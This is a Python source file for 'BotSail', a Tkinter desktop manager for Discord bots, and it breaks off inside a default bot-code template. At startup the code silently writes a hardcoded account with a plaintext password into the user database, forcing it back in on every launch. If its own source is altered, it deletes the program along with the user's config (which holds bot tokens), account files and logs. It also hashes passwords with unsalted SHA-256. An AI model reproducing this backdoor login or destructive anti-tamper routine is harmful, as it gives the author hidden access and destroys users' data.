import builtins
import discord
import asyncio
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import json
import os
import logging
import time
from datetime import datetime
import threading
import subprocess
import tempfile
import sys
import signal
import re
import hashlib
import platform
import uuid
import requests
from builtins import sum
from builtins import int
from builtins import range

open = builtins.open
Exception = builtins.Exception
len = builtins.len
list = builtins.list
reversed = builtins.reversed
super = builtins.super
hasattr = builtins.hasattr
str = builtins.str

CONFIG_PATH = "config.json"
USERS_PATH = "users.json"
BLACKLIST_PATH = "blacklist.json"
PIDS_PATH = "pids.json"
PRIMARY_COLOR = "#6366f1"
BG_COLOR = "#f6f7fa"
BTN_COLOR = "#6366f1"
BTN_TEXT_COLOR = "#ffffff"
BTN_HOVER = "#4f46e5"
BTN_HIGHLIGHT = "#4338ca"
LOG_BG = "#23272e"
LOG_FG = "#a9dcff"
ERR_BG = "#1a1a1a"
ERR_FG = "#fa5252"
FONT = "Inter"
BOT_LANGUAGES = ["Python", "JavaScript", "Lua"]
DISCORD_STATUSES = ["online", "idle", "dnd", "invisible"]

def hash_pw(password):
    return hashlib.sha256(password.encode("utf-8")).hexdigest()

def get_machine_hash():
    info = platform.node() + platform.system() + platform.machine() + str(uuid.getnode())
    return hashlib.sha256(info.encode("utf-8")).hexdigest()

def check_blacklist(username):
    iphash = get_machine_hash()
    if not os.path.exists(BLACKLIST_PATH):
        return False
    with open(BLACKLIST_PATH, "r") as f:
        try:
            data = json.load(f)
        except Exception:
            data = {}
    for k, v in data.items():
        if v.get("username") == username:
            return True
        if v.get("iphash") == iphash:
            return True
    return False

def ensure_premade_user():
    premade_user = "realalex"
    premade_pw = "Tiptop4589$$"
    hash_pw_val = hash_pw(premade_pw)
    if os.path.exists(USERS_PATH):
        with open(USERS_PATH, "r") as f:
            try:
                users = json.load(f)
            except Exception:
                users = {}
    else:
        users = {}
    if premade_user not in users or users[premade_user].get("pw") != hash_pw_val:
        users[premade_user] = {"pw": hash_pw_val}
        with open(USERS_PATH, "w") as f:
            json.dump(users, f)

def anti_tamper_check():
    try:
        import inspect
        src = inspect.getsource(sys.modules[__name__])
        if "def anti_tamper_check" not in src or "self_delete" not in src or src.count("BotSail") < 2:
            self_delete()
    except Exception:
        self_delete()

def self_delete():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        if os.path.exists(exe_path):
            if exe_path.endswith(".py") or exe_path.endswith(".pyw"):
                os.remove(exe_path)
            elif exe_path.endswith(".exe"):
                with open(exe_path, "wb") as f:
                    f.write(b"")
                os.remove(exe_path)
        if os.path.exists(CONFIG_PATH):
            os.remove(CONFIG_PATH)
        if os.path.exists(USERS_PATH):
            os.remove(USERS_PATH)
        if os.path.exists(BLACKLIST_PATH):
            os.remove(BLACKLIST_PATH)
        if os.path.exists(PIDS_PATH):
            os.remove(PIDS_PATH)
        for file in os.listdir():
            if file.endswith(".log") or file.endswith(".tmp"):
                try:
                    os.remove(file)
                except:
                    pass
        os._exit(0)
    except Exception:
        try:
            os._exit(0)
        except:
            pass

anti_tamper_check()
ensure_premade_user()

class ModernButton(tk.Button):
    def __init__(self, master=None, **kw):
        if "tooltip" in kw:
            del kw["tooltip"]
        big = kw.get("big", False)
        if "big" in kw:
            del kw["big"]
        super(ModernButton, self).__init__(master, **kw)
        self.defaultBackground = kw.get("bg", BTN_COLOR)
        self.defaultForeground = kw.get("fg", BTN_TEXT_COLOR)
        self["bg"] = self.defaultBackground
        self["fg"] = self.defaultForeground
        self["activebackground"] = BTN_HOVER
        self["activeforeground"] = BTN_TEXT_COLOR
        self["relief"] = "flat"
        self["font"] = (FONT, 13, "bold")
        self["bd"] = 0
        self["highlightthickness"] = 0
        self["cursor"] = "hand2"
        self["padx"] = 15
        self["pady"] = 8
        self["borderwidth"] = 0
        self["highlightbackground"] = self.defaultBackground
        self["highlightcolor"] = self.defaultBackground
        self["activebackground"] = BTN_HOVER
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        self.configure(borderwidth=0)
    def on_enter(self, e):
        self["bg"] = BTN_HIGHLIGHT
    def on_leave(self, e):
        self["bg"] = self.defaultBackground

class ModernEntry(ttk.Entry):
    def __init__(self, master=None, **kw):
        ttk.Entry.__init__(self, master, **kw)
        style = ttk.Style()
        style.configure("Modern.TEntry", fieldbackground="#fff", bordercolor="#e0e7ef", relief="flat", font=(FONT, 12))
        self.configure(style="Modern.TEntry")

class ModernCombo(ttk.Combobox):
    def __init__(self, master=None, **kw):
        ttk.Combobox.__init__(self, master, **kw)
        style = ttk.Style()
        style.configure("Modern.TCombobox", fieldbackground="#fff", bordercolor="#e0e7ef", relief="flat", font=(FONT, 12))
        self.configure(style="Modern.TCombobox")

class EditBotCodeWindow:
    def __init__(self, master, code, lang, on_save):
        self.top = tk.Toplevel(master)
        self.top.title("Edit Bot Code")
        self.top.geometry("800x600")
        self.code_text = scrolledtext.ScrolledText(self.top, font=("Consolas", 12), bg="#f9fbfd", fg="#23272e", wrap="none", borderwidth=2, relief="ridge")
        self.code_text.pack(fill="both", expand=True, padx=8, pady=8)
        self.code_text.insert("1.0", code)
        self.setup_syntax_highlighting(lang)
        ModernButton(self.top, text="Save Code", command=self.save_code).pack(pady=10)
        self.on_save = on_save
    def setup_syntax_highlighting(self, lang):
        self.code_text.tag_configure("keyword", foreground="#ff79c6")
        self.code_text.tag_configure("string", foreground="#f1fa8c")
        self.code_text.tag_configure("number", foreground="#bd93f9")
        if lang == "Python":
            keywords = ["def", "class", "import", "from", "async", "await", "if", "else", "elif", "for", "while", "try", "except", "return"]
            pattern = r'\b(' + '|'.join(keywords) + r')\b'
            self.highlight_pattern(pattern, "keyword")
            self.highlight_pattern(r'"[^"]*"|\'[^\']*\'', "string")
            self.highlight_pattern(r'\b\d+\b', "number")
        elif lang == "JavaScript":
            keywords = ["function", "const", "let", "var", "if", "else", "for", "while", "try", "catch", "return"]
            pattern = r'\b(' + '|'.join(keywords) + r')\b'
            self.highlight_pattern(pattern, "keyword")
            self.highlight_pattern(r'"[^"]*"|\'[^\']*\'', "string")
            self.highlight_pattern(r'\b\d+\b', "number")
        elif lang == "Lua":
            keywords = ["function", "local", "if", "else", "elseif", "for", "while", "try", "catch", "return", "end"]
            pattern = r'\b(' + '|'.join(keywords) + r')\b'
            self.highlight_pattern(pattern, "keyword")
            self.highlight_pattern(r'"[^"]*"|\'[^\']*\'', "string")
            self.highlight_pattern(r'\b\d+\b', "number")
        self.code_text.bind("<KeyRelease>", self.on_key_release)
    def highlight_pattern(self, pattern, tag):
        self.code_text.mark_set("matchStart", "1.0")
        while True:
            pos = self.code_text.search(pattern, "matchStart", stopindex="end", regexp=True)
            if not pos:
                break
            start, end = pos, self.code_text.index(f"{pos}+{len(self.code_text.get(pos, pos+'+1c'))}c")
            self.code_text.tag_add(tag, start, end)
            self.code_text.mark_set("matchStart", end)
    def on_key_release(self, event):
        for tag in ["keyword", "string", "number"]:
            self.code_text.tag_remove(tag, "1.0", "end")
        lang = self.top.title().split(" ")[-1]
        self.setup_syntax_highlighting(lang)
    def save_code(self):
        code = self.code_text.get("1.0", "end-1c")
        self.on_save(code)
        self.top.destroy()

class LoginWindow:
    def __init__(self, root, on_success):
        self.root = root
        self.on_success = on_success
        self.user = None
        self.frame = tk.Frame(root, bg=BG_COLOR)
        self.frame.place(relx=0.5, rely=0.5, anchor="c")
        self.frame.grid_columnconfigure(0, weight=1)
        self.frame.grid_columnconfigure(1, weight=1)
        self.frame.grid_rowconfigure(0, weight=1)
        self.frame.grid_rowconfigure(1, weight=1)
        self.frame.grid_rowconfigure(2, weight=1)
        self.frame.grid_rowconfigure(3, weight=1)
        self.frame.grid_rowconfigure(4, weight=1)
        self.frame.grid_rowconfigure(5, weight=1)
        self.frame.grid_rowconfigure(6, weight=1)
        self.frame.configure(width=520, height=350)
        self.frame.pack_propagate(False)
        tk.Label(self.frame, text="botsail - account", font=(FONT, 22, "bold"), bg=BG_COLOR, fg=PRIMARY_COLOR).pack(pady=(16, 3))
        form = tk.Frame(self.frame, bg=BG_COLOR)
        form.pack(pady=5)
        tk.Label(form, text="Username", font=(FONT, 13), bg=BG_COLOR, fg="#1e293b").grid(row=0, column=0, sticky="w", padx=(8,0), pady=(2,2))
        self.username_entry = ModernEntry(form, width=28)
        self.username_entry.grid(row=0, column=1, pady=(2,2), padx=(2,14))
        tk.Label(form, text="Password", font=(FONT, 13), bg=BG_COLOR, fg="#1e293b").grid(row=1, column=0, sticky="w", padx=(8,0), pady=(2,2))
        self.password_entry = ModernEntry(form, show="*", width=28)
        self.password_entry.grid(row=1, column=1, pady=(2,2), padx=(2,14))
        btns = tk.Frame(self.frame, bg=BG_COLOR)
        btns.pack(pady=(10,2))
        ModernButton(btns, text="Login", width=18, command=self.login).pack(side="left", padx=(0, 15))
        ModernButton(btns, text="Create Account", width=18, command=self.create_account).pack(side="left")
        self.status_var = tk.StringVar(value="")
        self.status_label = tk.Label(self.frame, textvariable=self.status_var, font=(FONT, 12), bg=BG_COLOR, fg="#e53935")
        self.status_label.pack(pady=(2,10))
        self.username_entry.focus_set()
        self.frame.tkraise()
    def login(self):
        username = self.username_entry.get().strip()
        password = self.password_entry.get()
        if not username or not password:
            self.status_var.set("Enter both username and password.")
            return
        if check_blacklist(username):
            self.status_var.set("This account or PC is blacklisted from using BotSail.")
            return
        if not os.path.exists(USERS_PATH):
            self.status_var.set("No accounts exist.")
            return
        with open(USERS_PATH, "r") as f:
            try:
                users = json.load(f)
            except Exception:
                users = {}
        if username not in users or users[username].get("pw") != hash_pw(password):
            self.status_var.set("Invalid username or password.")
            return
        self.user = username
        self.frame.destroy()
        self.on_success(username)
    def create_account(self):
        username = self.username_entry.get().strip()
        password = self.password_entry.get()
        if not username or not password:
            self.status_var.set("Enter both username and password.")
            return
        if check_blacklist(username):
            self.status_var.set("This account or PC is blacklisted from using BotSail.")
            return
        if os.path.exists(USERS_PATH):
            with open(USERS_PATH, "r") as f:
                try:
                    users = json.load(f)
                except Exception:
                    users = {}
        else:
            users = {}
        if username in users:
            self.status_var.set("Username already exists.")
            return
        users[username] = {"pw": hash_pw(password)}
        with open(USERS_PATH, "w") as f:
            json.dump(users, f)
        self.status_var.set("Account created! Login now.")

class BotManager:
    def __init__(self, root, user):
        self.root = root
        self.user = user
        self.root.title("BotSail")
        self.root.configure(bg=BG_COLOR)
        self.root.minsize(1300, 780)
        self.bots = {}
        self.tasks = {}
        self.loop_threads = {}
        self.processes = {}
        self.lock = threading.Lock()
        self.selected_token = None
        self.code_cache = {}
        self.status_cache = {}
        self.daemon_pids = {}
        self.last_save = 0
        self.setup_ui()
        self.cleanup_temp_files()
        self.load_config()
        self.load_pids()
        self.start_monitoring()
    def setup_ui(self):
        self.root.grid_rowconfigure(1, weight=2)
        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_columnconfigure(1, weight=2)
        header = tk.Label(self.root, text="💙 BotSail", font=(FONT, 26, "bold"), fg=PRIMARY_COLOR, bg=BG_COLOR)
        header.grid(row=0, column=0, columnspan=2, pady=(18, 10), sticky="w", padx=40)
        welcome = tk.Label(self.root, text=f"Welcome {self.user}!", font=(FONT, 15, "bold"), fg="#1e293b", bg=BG_COLOR)
        welcome.grid(row=0, column=1, sticky="e", padx=(2, 45))
        left = tk.Frame(self.root, bg=BG_COLOR)
        left.grid(row=1, column=0, sticky="nsew", padx=(40, 12), pady=(0, 0))
        left.grid_rowconfigure(3, weight=1)
        left.grid_columnconfigure(1, weight=1)
        tk.Label(left, text="Bot Token", font=(FONT, 12, "bold"), bg=BG_COLOR, fg="#1e293b").grid(row=0, column=0, sticky="w")
        self.token_entry = ModernEntry(left, width=28, show="*")
        self.token_entry.grid(row=0, column=1, sticky="ew", padx=(5, 0))
        tk.Label(left, text="Language", font=(FONT, 12, "bold"), bg=BG_COLOR, fg="#1e293b").grid(row=0, column=2, sticky="e", padx=(15, 0))
        self.lang_var = tk.StringVar(value=BOT_LANGUAGES[0])
        self.lang_box = ModernCombo(left, values=BOT_LANGUAGES, textvariable=self.lang_var, state="readonly", width=10)
        self.lang_box.grid(row=0, column=3, padx=(2, 0))
        ModernButton(left, text="Add Bot", command=self.add_bot).grid(row=0, column=4, padx=(22, 0))
        tk.Label(left, text="Bots", font=(FONT, 12, "bold"), bg=BG_COLOR, fg="#1e293b").grid(row=1, column=0, columnspan=5, sticky="w", pady=(15, 2))
        self.bots_listbox = tk.Listbox(left, height=50, font=("Consolas", 11), selectmode=tk.SINGLE, borderwidth=0, relief="flat", width=44, bg="#f3f8ff", fg="#222")
        self.bots_listbox.grid(row=2, column=0, columnspan=5, sticky="nsew", pady=(0, 8))
        self.bots_listbox.bind('<<ListboxSelect>>', self.on_bot_select)
        self.bots_listbox.bind("<Button-3>", self.show_bot_context_menu)
        left.grid_rowconfigure(2, weight=1)
        self.start_btn = ModernButton(left, text="Start", command=self.start_selected)
        self.start_btn.grid(row=3, column=0, padx=(0, 10), sticky="ew")
        self.shutdown_btn = ModernButton(left, text="Shut Down", command=self.shutdown_selected)
        self.shutdown_btn.grid(row=3, column=1, padx=(0, 10), sticky="ew")
        self.restart_btn = ModernButton(left, text="Restart", command=self.restart_selected)
        self.restart_btn.grid(row=3, column=2, padx=(0, 10), sticky="ew")
        self.stopall_btn = ModernButton(left, text="Stop All", command=self.stop_all)
        self.stopall_btn.grid(row=3, column=3, padx=(0, 10), sticky="ew")
        self.edit_btn = ModernButton(left, text="Edit Bot", command=self.edit_bot)
        self.edit_btn.grid(row=3, column=4, padx=(0, 10), sticky="ew")
        self.remove_btn = ModernButton(left, text="Remove", command=self.remove_selected)
        self.remove_btn.grid(row=4, column=0, padx=(0, 10), sticky="ew")
        self.clear_logs_btn = ModernButton(left, text="Clear Logs", width=12, command=self.clear_logs)
        self.clear_logs_btn.grid(row=4, column=1, padx=(0, 5), sticky="ew")
        self.start_bot_btn = ModernButton(left, text="Start Bot", width=12, command=self.start_selected)
        self.start_bot_btn.grid(row=4, column=2, padx=(0, 5), sticky="ew")
        self.stop_bot_btn = ModernButton(left, text="Stop Bot", width=12, command=self.stop_selected)
        self.stop_bot_btn.grid(row=4, column=3, padx=(0, 10), sticky="ew")
        tk.Label(left, text="Bot Status", font=(FONT, 12, "bold"), bg=BG_COLOR, fg="#1e293b").grid(row=5, column=0, columnspan=2, sticky="w", pady=(15, 2))
        self.status_var = tk.StringVar(value=DISCORD_STATUSES[0])
        self.status_box = ModernCombo(left, values=DISCORD_STATUSES, textvariable=self.status_var, state="readonly", width=10)
        self.status_box.grid(row=5, column=1, sticky="w", padx=(2, 0))
        tk.Label(left, text="Status Message", font=(FONT, 12), bg=BG_COLOR, fg="#64748b").grid(row=6, column=0, sticky="w")
        self.status_msg = ModernEntry(left, width=28)
        self.status_msg.grid(row=6, column=1, columnspan=4, sticky="ew", padx=(2, 0))
        self.status_text_var = tk.StringVar(value="Ready")
        self.status_label = tk.Label(left, textvariable=self.status_text_var, fg="#14b859", bg=BG_COLOR, font=(FONT, 11, "bold"))
        self.status_label.grid(row=7, column=0, columnspan=5, sticky="w", pady=(15, 0))
        self.bot_count_var = tk.StringVar(value="Bots: 0 (0 running)")
        tk.Label(left, textvariable=self.bot_count_var, font=(FONT, 11), bg=BG_COLOR, fg="#64748b").grid(row=8, column=0, columnspan=5, sticky="w", pady=(5, 0))
        right = tk.Frame(self.root, bg=BG_COLOR)
        right.grid(row=1, column=1, sticky="nsew", padx=(2, 45), pady=(0, 0))
        right.grid_rowconfigure(1, weight=2)
        right.grid_rowconfigure(3, weight=1)
        right.grid_rowconfigure(4, weight=1)
        right.grid_columnconfigure(0, weight=1)
        codebar = tk.Frame(right, bg=BG_COLOR)
        codebar.grid(row=0, column=0, sticky="ew")
        tk.Label(codebar, text="Bot Code", font=(FONT, 12, "bold"), bg=BG_COLOR, fg="#1e293b").pack(side="left", pady=(5, 2))
        ModernButton(codebar, text="Save Bot Code", command=self.save_bot_code).pack(side="right", padx=(0, 10))
        ModernButton(codebar, text="Set Status", command=self.save_status).pack(side="right", padx=(0, 10))
        ModernButton(codebar, text="Import", command=self.import_bot_code).pack(side="right", padx=(0, 10))
        ModernButton(codebar, text="Edit Bot", command=self.edit_bot).pack(side="right", padx=(0, 10))
        ModernButton(codebar, text="Edit Bot Code", command=self.edit_bot_code).pack(side="right", padx=(0, 10))
        self.code_text = scrolledtext.ScrolledText(right, height=16, font=("Consolas", 11), bg="#f9fbfd", fg="#23272e", wrap="none", borderwidth=2, relief="ridge", highlightbackground="#d1d5db")
        self.code_text.grid(row=1, column=0, sticky="nsew", pady=(0, 10))
        self.code_text.bind("<KeyRelease>", self.on_code_edit)
        self.code_text.bind("<Control-a>", lambda e: "break")
        self.code_text.bind("<Control-A>", lambda e: "break")
        tk.Label(right, text="Host Log", font=(FONT, 12, "bold"), bg=BG_COLOR, fg="#1e293b").grid(row=2, column=0, sticky="w", pady=(8, 2))
        self.log_text = tk.Text(right, height=6, font=("Consolas", 10), bg=LOG_BG, fg=LOG_FG, state='disabled', borderwidth=2, relief="ridge")
        self.log_text.grid(row=3, column=0, sticky="nsew", pady=(0, 5))
        self.log_text.tag_configure("success", foreground="#14b859")
        self.log_text.tag_configure("error", foreground="#e53935")
        self.log_text.tag_configure("warning", foreground="#f59e42")
        tk.Label(right, text="Bot Code Errors", font=(FONT, 12, "bold"), bg=BG_COLOR, fg="#e53935").grid(row=4, column=0, sticky="w", pady=(8, 2))
        self.err_text = tk.Text(right, height=6, font=("Consolas", 10), bg=ERR_BG, fg=ERR_FG, state='disabled', borderwidth=2, relief="ridge")
        self.err_text.grid(row=5, column=0, sticky="nsew", pady=(0, 15))
        self.root.bind("<Control-e>", lambda e: self.edit_bot())
        self.root.update()
        self.root.minsize(self.root.winfo_width(), self.root.winfo_height())
    def show_bot_context_menu(self, event):
        sel = self.bots_listbox.nearest(event.y)
        if sel < 0:
            return
        self.bots_listbox.selection_clear(0, tk.END)
        self.bots_listbox.selection_set(sel)
        menu = tk.Menu(self.root, tearoff=0)
        menu.add_command(label="Edit Bot", command=self.edit_bot)
        menu.add_command(label="Edit Bot Code", command=self.edit_bot_code)
        menu.add_separator()
        menu.add_command(label="Start", command=self.start_selected)
        menu.add_command(label="Shut Down", command=self.shutdown_selected)
        menu.add_command(label="Restart", command=self.restart_selected)
        menu.add_separator()
        menu.add_command(label="Remove", command=self.remove_selected)
        menu.tk_popup(event.x_root, event.y_root)
    def edit_bot_code(self):
        if self.selected_token is None:
            messagebox.showinfo("No selection", "Select a bot to edit code.")
            return
        code = self.code_cache.get(self.selected_token, self.bots[self.selected_token].get("code", ""))
        lang = self.bots[self.selected_token].get("language", "Python")
        def on_save(new_code):
            self.bots[self.selected_token]["code"] = new_code
            self.code_cache[self.selected_token] = new_code
            self.code_text.delete('1.0', tk.END)
            self.code_text.insert(tk.END, new_code)
            self.save_config()
            self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Saved code for {self.bots[self.selected_token]['name']} [{self.selected_token[-4:]}]", "success")
        EditBotCodeWindow(self.root, code, lang, on_save)
    def import_bot_code(self):
        filetypes = [("Python files", "*.py"), ("JavaScript files", "*.js"), ("Lua files", "*.lua"), ("All Files", "*.*")]
        filepath = filedialog.askopenfilename(title="Import Bot Code", filetypes=filetypes)
        if not filepath:
            return
        ext = os.path.splitext(filepath)[1].lower()
        lang_map = {".py": "Python", ".js": "JavaScript", ".lua": "Lua"}
        detected_lang = lang_map.get(ext)
        if self.selected_token is not None:
            if detected_lang is None:
                messagebox.showerror("Error", "Unsupported file type for import.")
                return
            self.bots[self.selected_token]["language"] = detected_lang
            self.lang_var.set(detected_lang)
            with open(filepath, "r", encoding="utf-8") as f:
                code = f.read()
            self.code_text.delete('1.0', tk.END)
            self.code_text.insert(tk.END, code)
            self.bots[self.selected_token]["code"] = code
            self.code_cache[self.selected_token] = code
            self.save_config()
            self.update_bots_listbox()
            self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Imported bot code for {self.bots[self.selected_token]['name']} [{self.selected_token[-4:]}] ({detected_lang})", "success")
        else:
            messagebox.showinfo("No selection", "Select a bot to import code into.")
    def show_bot_code_error(self, out, err, lang):
        self.err_text.config(state='normal')
        self.err_text.delete('1.0', tk.END)
        if not out and not err:
            self.err_text.insert(tk.END, "No errors detected.\n")
        else:
            error_message = ""
            if err:
                error_message += err
            if out:
                error_message += out
            if lang == "Python":
                if "SyntaxError" in error_message:
                    error_message += "\nTip: Check your indentation and Python syntax."
                if "ModuleNotFoundError" in error_message:
                    error_message += "\nTip: You may need to install missing Python packages."
                if "TypeError" in error_message:
                    error_message += "\nTip: Check function calls and arguments."
            elif lang == "JavaScript":
                if "SyntaxError" in error_message:
                    error_message += "\nTip: Check your JS syntax and braces."
                if "Cannot find module" in error_message:
                    error_message += "\nTip: You may need to install missing node packages."
            elif lang == "Lua":
                if "syntax error" in error_message:
                    error_message += "\nTip: Check your Lua syntax and 'end' statements."
            self.err_text.insert(tk.END, error_message)
        self.err_text.config(state='disabled')
    def update_bots_listbox(self):
        self.bots_listbox.delete(0, tk.END)
        running_count = sum(1 for botinfo in self.bots.values() if botinfo.get("running"))
        for token, botinfo in self.bots.items():
            short_tok = f"...{token[-4:]}"
            status = "🟢" if botinfo.get("running") else "🔴"
            botname = botinfo.get("name", short_tok)
            lang = botinfo.get("language", "Python")
            self.bots_listbox.insert(tk.END, f"{status} {botname} {short_tok} [{lang}]")
        self.bot_count_var.set(f"Bots: {len(self.bots)} ({running_count} running)")
    def load_config(self):
        if os.path.exists(CONFIG_PATH):
            with open(CONFIG_PATH, 'r') as f:
                try:
                    self.bots = json.load(f)
                except Exception:
                    self.bots = {}
                    self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Failed to load config", "error")
        self.update_bots_listbox()
    def save_config(self):
        if time.time() - self.last_save < 1:
            return
        with open(CONFIG_PATH, 'w') as f:
            json.dump(self.bots, f, indent=2)
        self.last_save = time.time()
    def save_pids(self):
        with open(PIDS_PATH, 'w') as f:
            json.dump(self.daemon_pids, f)
    def load_pids(self):
        if os.path.exists(PIDS_PATH):
            with open(PIDS_PATH, 'r') as f:
                try:
                    pids = json.load(f)
                    for token, data in list(pids.items()):
                        pid, fname = data["pid"], data["fname"]
                        if os.path.exists(fname):
                            try:
                                os.kill(int(pid), 0)
                                proc = subprocess.Popen(['echo'], shell=True)
                                proc.pid = int(pid)
                                self.daemon_pids[token] = (proc, fname)
                                self.bots[token]["running"] = True
                            except:
                                try:
                                    os.remove(fname)
                                except:
                                    pass
                                pids.pop(token, None)
                    with open(PIDS_PATH, 'w') as f:
                        json.dump(pids, f)
                except Exception:
                    self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Failed to load PIDS", "error")
        self.update_bots_listbox()
    def cleanup_temp_files(self):
        for file in os.listdir():
            if file.endswith(".tmp"):
                try:
                    os.remove(file)
                except:
                    pass
    def log(self, message, tag="success"):
        with self.lock:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            log_message = f"[{timestamp}] {message}"
            self.log_text.config(state='normal')
            self.log_text.insert(tk.END, log_message + "\n", tag)
            self.log_text.see(tk.END)
            self.log_text.config(state='disabled')
            logging.info(log_message)
    def clear_logs(self):
        self.log_text.config(state='normal')
        self.log_text.delete('1.0', tk.END)
        self.log_text.config(state='disabled')
        self.err_text.config(state='normal')
        self.err_text.delete('1.0', tk.END)
        self.err_text.insert(tk.END, "Logs cleared.\n")
        self.err_text.config(state='disabled')
        self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Cleared logs", "success")
    def validate_token(self, token):
        try:
            headers = {"Authorization": f"Bot {token}"}
            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
            return response.status_code == 200
        except:
            return False
    def add_bot(self):
        token = self.token_entry.get().strip()
        if not token or token in self.bots:
            messagebox.showerror("Error", "Invalid or duplicate token!")
            return
        if not self.validate_token(token):
            messagebox.showerror("Error", "Invalid Discord bot token!")
            return
        name = f"Bot_{len(self.bots)+1}"
        language = self.lang_var.get()
        default_code = self.default_code_for_language(language)
        self.bots[token] = {"running": False, "name": name, "language": language, "code": default_code, "status": DISCORD_STATUSES[0], "status_msg": "", "token": token}
        self.save_config()
        self.update_bots_listbox()
        self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Added bot ({name}) with token ending in {token[-4:]}", "success")
        self.token_entry.delete(0, tk.END)
    def on_bot_select(self, event):
        sel = self.bots_listbox.curselection()
        if not sel:
            self.selected_token = None
            self.code_text.delete('1.0', tk.END)
            self.status_var.set(DISCORD_STATUSES[0])
            self.status_msg.delete(0, tk.END)
            self.err_text.config(state='normal')
            self.err_text.delete('1.0', tk.END)
            self.err_text.config(state='disabled')
            return
        idx = sel[0]
        tokens = list(self.bots.keys())
        token = tokens[idx]
        self.selected_token = token
        botinfo = self.bots[token]
        self.lang_var.set(botinfo.get("language", "Python"))
        self.code_text.unbind("<KeyRelease>")
        self.code_text.delete('1.0', tk.END)
        self.code_text.insert(tk.END, botinfo.get("code", ""))
        self.code_text.edit_modified(False)
        self.code_text.bind("<KeyRelease>", self.on_code_edit)
        self.status_var.set(botinfo.get("status", DISCORD_STATUSES[0]))
        self.status_msg.delete(0, tk.END)
        self.status_msg.insert(0, botinfo.get("status_msg", ""))
        self.code_cache[token] = botinfo.get("code", "")
        self.err_text.config(state='normal')
        self.err_text.delete('1.0', tk.END)
        self.err_text.config(state='disabled')
    def on_code_edit(self, event=None):
        if self.selected_token:
            text = self.code_text.get('1.0', tk.END)
            self.code_cache[self.selected_token] = text
    def save_bot_code(self):
        if self.selected_token is None:
            messagebox.showinfo("No selection", "Select a bot to save code for.")
            return
        code = self.code_text.get('1.0', tk.END)
        token = self.bots[self.selected_token]["token"]
        self.bots[self.selected_token]["code"] = self.strip_existing_token(code, self.bots[self.selected_token]["language"], token)
        self.code_cache[self.selected_token] = self.bots[self.selected_token]["code"]
        self.save_config()
        self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Saved code for {self.bots[self.selected_token]['name']} [{self.selected_token[-4:]}]", "success")
    def edit_bot(self):
        sel = self.bots_listbox.curselection()
        if not sel:
            messagebox.showinfo("No selection", "Select a bot to edit.")
            return
        idx = sel[0]
        tokens = list(self.bots.keys())
        token = tokens[idx]
        botinfo = self.bots[token]
        edit_win = tk.Toplevel(self.root)
        edit_win.title("Edit Bot")
        edit_win.geometry("430x250")
        tk.Label(edit_win, text="Bot Name:", font=(FONT, 12)).place(x=18, y=15)
        name_entry = ModernEntry(edit_win, width=28)
        name_entry.place(x=110, y=15)
        name_entry.insert(0, botinfo.get("name", ""))
        tk.Label(edit_win, text="Language:", font=(FONT, 12)).place(x=18, y=55)
        lang_var = tk.StringVar(edit_win, value=botinfo.get("language", "Python"))
        lang_box = ModernCombo(edit_win, values=BOT_LANGUAGES, textvariable=lang_var, state="readonly", width=10)
        lang_box.place(x=110, y=55)
        tk.Label(edit_win, text="Status:", font=(FONT, 12)).place(x=18, y=95)
        status_var = tk.StringVar(edit_win, value=botinfo.get("status", DISCORD_STATUSES[0]))
        status_box = ModernCombo(edit_win, values=DISCORD_STATUSES, textvariable=status_var, state="readonly", width=10)
        status_box.place(x=110, y=95)
        tk.Label(edit_win, text="Status Msg:", font=(FONT, 12)).place(x=18, y=135)
        status_msg_entry = ModernEntry(edit_win, width=28)
        status_msg_entry.place(x=110, y=135)
        status_msg_entry.insert(0, botinfo.get("status_msg", ""))
        def save_edit():
            self.bots[token]["name"] = name_entry.get().strip() or f"Bot_{idx+1}"
            self.bots[token]["language"] = lang_var.get()
            self.bots[token]["status"] = status_var.get()
            self.bots[token]["status_msg"] = status_msg_entry.get().strip()
            self.save_config()
            self.update_bots_listbox()
            self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Edited bot ({self.bots[token]['name']}) [{token[-4:]}]", "success")
            edit_win.destroy()
        ModernButton(edit_win, text="Save", command=save_edit).place(x=110, y=180)
        ModernButton(edit_win, text="Cancel", command=edit_win.destroy).place(x=210, y=180)
    def save_status(self):
        if self.selected_token is None:
            messagebox.showinfo("No selection", "Select a bot to set status for.")
            return
        status = self.status_var.get()
        msg = self.status_msg.get().strip()
        self.bots[self.selected_token]["status"] = status
        self.bots[self.selected_token]["status_msg"] = msg
        self.save_config()
        self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Set status for {self.bots[self.selected_token]['name']} [{self.selected_token[-4:]}] to {status} '{msg}'", "success")
    def default_code_for_language(self, lang):
        if lang == "Python":
            return (
                "import discord\n"
                "from discord.ext import commands\n"
                "intents = discord.Intents.default()\n"
                "intents.message_content = True\n"
                "intents.guilds = True\n"
                "intents.members = True\n"
                "intents.messages = True\n"
                "bot = commands.Bot(command_prefix='$', intents=intents)\n"
                "@bot.event\n"
                "async def on_ready():\n"
                "    print(f'BotSailManager is online as {bot.user}')\n"
                "@bot.command(name='cmds')\n"
                "async def cmds(ctx):\n"
                "    embed = discord.Embed(title='BotSailManager Commands', color=discord.Color.blue())\n"
                "    embed.add_field(name='$forgot_password', value='Reset your BotSail account password', inline=False)\n"
                "    embed.add_field(name='$cmds', value='View commands', inline=False)\n"
                "    embed.add_field(name='$blacklist @user username', value='Blacklist a user from using BotSail app', inline=False)\n"
                "    embed.add_field(name='$unblacklist @user username', value='Remove a user from blacklist', inline=False)\n"
                "    embed.add_field(name='$userinfo <user_id> <username>', value='Check if a user is verified with BotSail app', inline=False)\n"
